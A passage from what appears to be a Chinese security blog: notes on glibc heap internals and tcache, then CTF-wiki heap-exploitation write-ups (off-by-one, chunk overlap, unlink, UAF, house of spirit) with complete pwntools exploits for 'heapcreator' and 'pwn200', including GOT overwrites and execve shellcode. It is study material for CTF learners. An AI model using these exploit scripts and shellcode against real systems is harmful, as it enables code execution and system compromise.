<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">  <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">  nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line">  <span class="comment">/* consolidate forward */</span></span><br><span class="line">  <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">    unlink_chunk (av, nextchunk);</span><br><span class="line">    size += nextsize;</span><br><span class="line">  &#125; <span class="keyword">else</span></span><br><span class="line">    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">    not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">    been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  bck = unsorted_chunks(av);</span><br><span class="line">  fwd = bck-&gt;fd;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">  p-&gt;fd = fwd;</span><br><span class="line">  p-&gt;bk = bck;</span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">    &#123;</span><br><span class="line">      p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">      p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  bck-&gt;fd = p;</span><br><span class="line">  fwd-&gt;bk = p;</span><br><span class="line">  set_head(p, size | PREV_INUSE);</span><br><span class="line">  set_foot(p, size);</span><br><span class="line">  check_free_chunk(av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>如果下一个chunk是top chunk，则合并到top chunk中</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">  consolidate into top</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  size += nextsize;</span><br><span class="line">  set_head(p, size | PREV_INUSE);</span><br><span class="line">  av-&gt;top = p;</span><br><span class="line">  check_chunk(av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>向系统返还内存<br>
如果合并后的chunk大小大于fastbin_consolidation_threshold（默认64k），就向系统返还内存</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If freeing a large space, consolidate possibly-surrounding</span></span><br><span class="line"><span class="comment">      chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class="line"><span class="comment">      threshold, ask malloc_trim to reduce top.</span></span><br><span class="line"><span class="comment">      Unless max_fast is 0, we don&#x27;t know if there are fastbins</span></span><br><span class="line"><span class="comment">      bordering top, so we cannot tell for sure whether threshold</span></span><br><span class="line"><span class="comment">      has been reached unless fastbins are consolidated.  But we</span></span><br><span class="line"><span class="comment">      don&#x27;t want to consolidate on each free.  As a compromise,</span></span><br><span class="line"><span class="comment">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line"><span class="comment">      is reached.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">      <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">        malloc_consolidate(av);</span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">            (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.trim_threshold))</span><br><span class="line">          systrim(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">           large, because the corresponding heap might go away.  */</span></span><br><span class="line">        heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line">        assert(heap-&gt;ar_ptr == av);</span><br><span class="line">        heap_trim(heap, mp_.top_pad);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!have_lock)</span><br><span class="line">      __libc_lock_unlock (av-&gt;mutex);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>释放mmap出的内存</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    munmap_chunk (p);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="tcache">tcache</h2>
<p>glibc2.26后引入的技术，提升堆管理的性能，也舍弃了很多安全检查</p>
<p>引入了两个结构体&quot;tcache_entry&quot;和&quot;tcache_perthread_struct&quot;</p>
<ul>
<li><strong>tcache_entry</strong>用单向链表的方式连接大小相同的空闲chunk结构体；</li>
<li>每个线程会维护一个<strong>tcache_perthread_struct</strong>，作为tcache的管理结构，维护tcache_max_bins个计数器和tcache_max_bins项tcache_entry，规定每条tcache_entry最多有七个chunk</li>
</ul>
<h3 id="工作方式">工作方式</h3>
<ul>
<li>第一次 malloc 时，会先 malloc 一块内存用来存放 tcache_prethread_struct 。</li>
<li>free 内存，且 size 小于 small bin size 时
<ul>
<li>先放到对应的 tcache 中，直到 tcache 被填满（默认是 7 个）</li>
<li>tcache 被填满之后，再次 free 的内存和之前一样被放到 fastbin 或者 unsorted bin 中</li>
<li>tcache 中的 chunk 不会合并（不取消 inuse bit）</li>
</ul>
</li>
<li>malloc 内存，且 size 在 tcache 范围内</li>
<li>先从 tcache 取 chunk，直到 tcache 为空，tcache 为空后，从 bin 中找</li>
<li>tcache 为空时，如果 fastbin/smallbin/unsorted bin 中有 size 符合的 chunk，会先把 fastbin/smallbin/unsorted bin 中的 chunk 放到 tcache 中，直到填满。之后再从 tcache 中取；因此 chunk 在 bin 中和 tcache 中的顺序会反过来</li>
</ul>
<h1>参考：</h1>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE3NzEzOTM1L2FydGljbGUvZGV0YWlscy84NjIzMTUwMg==">https://blog.csdn.net/qq_17713935/article/details/86231502<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8yNDc1Mzg2MQ==">Linux堆内存管理深入分析（上）<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8yNDc5MDE2NA==">Linux堆内存管理深入分析（下）<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L2dsaWJjLWhlYXAvaW1wbGVtZW50YXRpb24vb3ZlcnZpZXcv">ctf-wiki<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC83NzMxNjIwNg==">https://zhuanlan.zhihu.com/p/77316206<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfwiki堆漏洞整理</title>
    <url>/12265.html</url>
    <content><![CDATA[<p>不出意外的话我应该是把这个鸽掉了</p>
<span id="more"></span>
<h1>堆溢出</h1>
<p>向某个堆块写入的字节数超过了可用字节数（堆管理器会对用户申请的字节数进行调整，可用字节数可能大于申请的字节数），数据溢出到下一个（物理相邻的高地址）堆块上</p>
<p><strong>利用策略</strong>：</p>
<ul>
<li>1.覆盖下一个chunk的内容</li>
<li>2.利用堆中的机制如unlink，实现任意地址写入或者控制堆块中的内容</li>
</ul>
<h2 id="几个重要步骤">几个重要步骤</h2>
<ol>
<li>寻找堆分配函数：malloc、calloc、realloc（根据参数size的不同，实现分配和释放的功能）<br>
malloc不能初始化分配的空间，可能遗留上一次释放前的数据；calloc会把分配空间的每一位都初始化为空</li>
<li>寻找危险函数（输入输出、字符串操作）</li>
<li>确定填充长度（注意对齐以及可能借用下一chunk的pre_size）</li>
</ol>
<h2 id="Off-By-One-堆">Off-By-One(堆)</h2>
<p>指溢出了一个字节（单字节缓冲区溢出）</p>
<h3 id="利用思路">利用思路</h3>
<ol>
<li>修改堆大小使堆块结构出现重叠，泄露其他数据或者覆盖其他数据</li>
<li>使prev_in_use位清零，这时前块会被认为是空闲的
<ol>
<li>unlink</li>
<li>伪造prev_size造成堆块之间的重叠（前提是unlink的时候没有检查按prev_size找到的块和prev_size大小是否一致</li>
</ol>
</li>
</ol>
<h3 id="b00k">b00k</h3>
<p>然后运行一下看看程序的运行，再进ida，函数名已经把功能写的很清楚了：<br>
main函数：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309165145.png" alt="20210309165145"></p>
<p>发现每次读入都是调用这个函数：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309165416.png" alt="20210309165416"><br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309165312.png" alt="20210309165312"><br>
而仔细想想这个函数，发现当长度为32时，刚好能把结束符覆盖到下一个字节，而程序刚开始运行输入的author_name存储的位置也真的是非常的巧妙：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309165850.png" alt="20210309165850"><br>
也就是说我们能够泄露出book信息存放的地址了</p>
<h1>Chunk extend &amp; overlapping</h1>
<p>主要是通过其他漏洞（如off by one）修改某个chunk的size，达到覆盖后面几个chunk的效果，这样就能直接修改后面chunk的内容，造成任意地址读、控制执行等</p>
<h2 id="heapcreator">heapcreator</h2>
<p>照例先check一波</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">pluto@pluto-virtual-machine:~/Desktop$ checksec heapcreator </span><br><span class="line">[*] <span class="string">&#x27;/home/pluto/Desktop/heapcreator&#x27;</span></span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>
<p>main函数：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309170512.png" alt="20210309170512"><br>
create():<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309170921.png" alt="20210309170921"><br>
进入create，先为heaparry中一个成员申请出一块空间，再让这块空间中的第二个位置（*((void **)heaparray[i] + 1)）指向content的内容</p>
<p>用gdb先分配一下，create两次，大小为2，内容分别为aa和bb，可以看到分配了四个堆：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309184045.png" alt="20210309184045"></p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309184657.png" alt="20210309184657"><br>
这里回顾一下chunk的结构：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309184724.png" alt="20210309184724"><br>
pre_size这个字段（8字节）在p==1即前一个chunk在使用时是提供给前一个chunk使用的<br>
至于为什么分配的大小都是0x21，是因为分配的时候会将申请的大小转换为实际分配的大小，64位下要是16的整数倍，0x21/16==2</p>
<p>edit函数，19行明显可以造成溢出<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309185720.png" alt="20210309185720"><br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309185824.png" alt="20210309185824"></p>
<p>剩下两个函数都是没啥大问题的</p>
<p>于是可以想到，构造三个chunk，然后通过第一个chunk改变第二个chunk的大小使得2、3chunk overlapping；<br>
free chunk2，然后再次分配改变第三个chunk的大小和内容，使其指向free.got，接着调用show()把free的地址打印出来；<br>
这时因为目标是调用system(“/bin/sh”)所以还需要劫持free的got表，而<strong>由于此时chunk2的ptr已经修改为free_got了，编辑chunk2就相当于改free_got了</strong>；<br>
于是最后一步就只需要再造一个chunk，写入’/bin/sh’然后释放，就能达到getshell的目的</p>
<p>关于加粗部分：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309193527.png" alt="20210309193527"></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./heapcreator&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./heapcreator&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size, payload</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,<span class="built_in">str</span>(payload))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>, payload</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Content of heap : &quot;</span>,<span class="built_in">str</span>(payload))</span><br><span class="line">	p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">&quot;aaaa&quot;</span>)	</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&quot;bbbb&quot;</span>)</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&quot;cccc&quot;</span>)</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x18</span> + <span class="string">&#x27;\x81&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x40</span> + <span class="string">&#x27;\x08&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>) + p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">create(<span class="number">0x70</span>,payload)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Content : &quot;</span>)</span><br><span class="line">free_addr = u64(p.recvuntil(<span class="string">&quot;Done&quot;</span>)[:-<span class="number">5</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(free_addr)</span><br><span class="line">free_sys_offset = -<span class="number">0x3f1a0</span></span><br><span class="line">sys_addr = free_addr + free_sys_offset</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;\nsys_addr:   &#x27;</span> + <span class="built_in">hex</span>(sys_addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(sys_addr)) </span><br><span class="line">gdb.attach(p)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1>Unlink</h1>
<p>对于两个释放了的物理相邻的chunk，在内存回收进行合并时会加入新的bin，此时有可能产生攻击点</p>
<p>unlink的过程：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309195222.png" alt="20210309195222"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当我们 free() 时</span><br><span class="line">glibc 判断这个块是 small chunk</span><br><span class="line">判断前向合并，发现前一个 chunk 处于使用状态，不需要前向合并</span><br><span class="line">判断后向合并，发现后一个 chunk 处于空闲状态，需要合并</span><br><span class="line">继而对 Nextchunk 采取 unlink 操作</span><br><span class="line"></span><br><span class="line">unlink 具体执行的效果:</span><br><span class="line">FD=P-&gt;fd = target addr -12</span><br><span class="line">BK=P-&gt;bk = expect value</span><br><span class="line">FD-&gt;bk = BK，即 *(target addr-12+12)=BK=expect value</span><br><span class="line">BK-&gt;fd = FD，即 *(expect value +8) = FD = target addr-12</span><br></pre></td></tr></table></figure>
<h1>UAF</h1>
<p>主要有这两种情况：</p>
<ul>
<li>内存块被释放后，其对应的指针没有被设置为 NULL，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。</li>
<li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">释放后没有被置为NULL的指针称为dangling pointer（悬空指针）</span><br><span class="line">没有初始化的指针称为wild pointer（野指针）</span><br></pre></td></tr></table></figure>
<p>关注到free后没有把指针指向NULL的代码片段</p>
<h2 id="hacknote">hacknote</h2>
<p>据说是很经典的UAF入门题。网上关于这个题的分析有很多了，但还有一些点是自己看了别人的wp然后想了好久才理解到的，就记录一下一些点。</p>
<p>第一次add两个node时：<br>
notelist数组中的值：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201218132834.png" alt="20201218132834"></p>
<p>notelist[i]指向的chunk中的内容，其中0x0804865b是print_note_content函数的地址：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201218133230.png" alt="20201218133230"></p>
<p>删除两个node后：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201218133934.png" alt="20201218133934"><br>
可以看到chunk里的内容改变了，但是notelist数组的前两个值依然指向原来的chunk<br>
（这里free的顺序出了点小问题）</p>
<p>再次add一个大小为8的node时：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201218134358.png" alt="20201218134358"><br>
发现原来的两个chunk分配给了新生成的node，。<br>
因为上面free的顺序反了导致notelist[0]和[2]指向了相同的位置，本可以把第一个chunk的内容覆盖为system的gadget，不过…意思到了就行。</p>
<p>如果覆盖为system(…)即程序提供的magic函数，就可以print_nodelist[0],调用magic函数，获得shell</p>
<p>over！</p>
<h1>FASTBIN有关的漏洞</h1>
<ol>
<li>fastbin double free</li>
<li>house of spirit</li>
<li>alloc to stack</li>
<li>arbitrary alloc</li>
</ol>
<p>前两种主要侧重利用free函数释放真的或者伪造的chunk，然后再申请chunk进行攻击；后两种侧重于修改fd指针，利用malloc申请执行位置的chunk<br>
原理在于，fastbin由单链表维护，并且fastbin中的chunk即使释放了，next_chunk的pre_inuse位也不会清空</p>
<h2 id="lctf2016-pwn200">lctf2016-pwn200</h2>
<p>首先依旧是：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210316212059.png" alt="20210316212059"><br>
发现什么保护都没有开，（这就使得这个题有两种做法…）<br>
再用ROPgadget搜索，没有看到system和/bin/sh</p>
<p>用ida打开，先看一波main_2函数：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210316212316.png" alt="20210316212316"><br>
其中第一个漏洞点就是在输入 “who am i” 的时候，当输入长度为48的时候，最后一位（本应该是结束符\0）会变成有效的字符，与后续的rbp相连，在下一句printf会将rbp打印出来<br>
该函数的倒数第二句，在ida的伪c代码中，input返回后没有赋给任何变量，但实际上看汇编代码会发现：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210316213816.png" alt="20210316213816"><br>
刚好紧挨在“whoami”的上边</p>
<p>再看main_2的返回函数<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210316214104.png" alt="20210316214104"><br>
程序唯一的两个出现malloc的函数之一。<br>
这个函数主要是分配一个固定大小的区域，然后将输入的buf复制到区块中，再把地址赋给ptr，ptr存在bss段中（0x0602098）。<br>
strcpy有多危险就不用说了，其次，buf的长度为0x38，读入的长度却是0x40，可以把dest覆盖掉：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210316215426.png" alt="20210316215426"></p>
<p>随后的loo函数就是一个选择菜单功能，其中有checkin和checkout。checkout函数在检查指针存在性后，把ptr的堆块释放，并把指针置为0。<br>
checkout函数如下：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210316215654.png" alt="20210316215654"><br>
把输入的“long”当作malloc的大小，malloc出的地址赋给ptr，然后再把&quot;money&quot;直接放入新建立的chunk中。</p>
<h3 id="HOS">HOS</h3>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210315165708.png" alt="20210315165708"><br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210315165656.png" alt="20210315165656"></p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210315222308.png" alt="20210315222308"></p>
<p>大致的思路就是：</p>
<ul>
<li>在第一次输入money（存入buf）时构造出一个chunk（方法是覆盖dest），指向输入的这个栈，此时这个区域在计算机的角度就成了一个chunk。</li>
<li>将这个堆释放再分配，这个区域就变得可控，可以一直控制到返回地址</li>
<li>因为这些函数是一个调用一个的，所以choose 3，结束了最顶层的函数，就可以返回执行shellcode</li>
</ul>
<p>其中exp（下）中传入的id==0x61，意思是伪造fake_chunk的下一个chunk（物理相连）的size。</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210316223428.png" alt="20210316223428"></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn200&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05&quot;</span></span><br><span class="line">p.send(shellcode + <span class="string">&quot;a&quot;</span>*(<span class="number">48</span>-<span class="built_in">len</span>(shellcode)))</span><br><span class="line">rbp = u64(p.recvuntil(<span class="string">&quot;?\n&quot;</span>)[<span class="number">48</span>:<span class="number">48</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(rbp)</span><br><span class="line"></span><br><span class="line">shellcode_addr = rbp - <span class="number">0x50</span></span><br><span class="line">fake_chunk = rbp - <span class="number">0xb0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(shellcode_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;17&quot;</span>)	<span class="comment">#?min==17</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;money~&quot;</span>)</span><br><span class="line"><span class="comment">#payload = &quot;A&quot;*0x8 + &quot;B&quot;*0x10</span></span><br><span class="line">payload = <span class="string">&quot;\x00&quot;</span>*<span class="number">8</span> + p64(<span class="number">0x61</span>) + <span class="string">&quot;\x00&quot;</span>*<span class="number">0x28</span> + p64(fake_chunk)   <span class="comment">#make a fake_chunk here</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice :&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice :&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;how long?&quot;</span>,<span class="string">&quot;79&quot;</span>)   <span class="comment">#97==0x61</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x38</span> + p64(shellcode_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;money : &quot;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice :&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>多调试！！！</p>
<h3 id="非HOS">非HOS</h3>
<p>把dest的值覆盖为free_got，；此时如果buf中为&quot;shellocde_addr&quot;+“\x00”*n，free的got表就指向shellcode，执行free时就相当于执行shellocde</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./pwn200&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn200&quot;</span>)</span><br><span class="line">arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">shellcode=<span class="string">&quot;\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05&quot;</span></span><br><span class="line">p.send(shellcode + <span class="string">&quot;a&quot;</span>*(<span class="number">48</span>-<span class="built_in">len</span>(shellcode)))	</span><br><span class="line">rbp = u64(p.recvuntil(<span class="string">&quot;?\n&quot;</span>)[<span class="number">48</span>:<span class="number">48</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(rbp)</span><br><span class="line">shellcode_addr = rbp - <span class="number">0x50</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(shellcode_addr)</span><br><span class="line"><span class="comment"># leak rbp &amp; shellcode_addr</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;111&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;~\n&quot;</span>)</span><br><span class="line">payload = p64(shellcode_addr) + <span class="string">&quot;\x00&quot;</span>*(<span class="number">0x38</span>-<span class="built_in">len</span>(p64(shellcode_addr))) + p64(elf.got[<span class="string">&quot;free&quot;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="2014-hack-lu-oreo">2014 <span class="exturl" data-url="aHR0cDovL2hhY2subHU=">hack.lu<i class="fa fa-external-link-alt"></i></span> oreo</h2>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331101129.png" alt="20210331101129"></p>
<p>拖到ida里分析一波，main函数做了个初始化<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331101246.png" alt="20210331101246"><br>
sub_804898D()里包括了菜单和进入各个功能函数的跳转<br>
（说个题外话，这题用sendlineafter的话会一直等待after的字符串，不知道为啥…</p>
<p>嗯，继续</p>
<p>add：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331102125.png" alt="20210331102125">add函数做了如下操作：</p>
<ul>
<li>开辟0x38大小的空间</li>
<li>从0x19的位置开始读入最长为0x38的字符串，并在末尾\0</li>
<li>从起始位置读入长度为0x38的字符串，并在末尾\0</li>
<li>add_not_order_num+1</li>
</ul>
<p>show_add:<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331102328.png" alt="20210331102328"></p>
<p>order：<br>
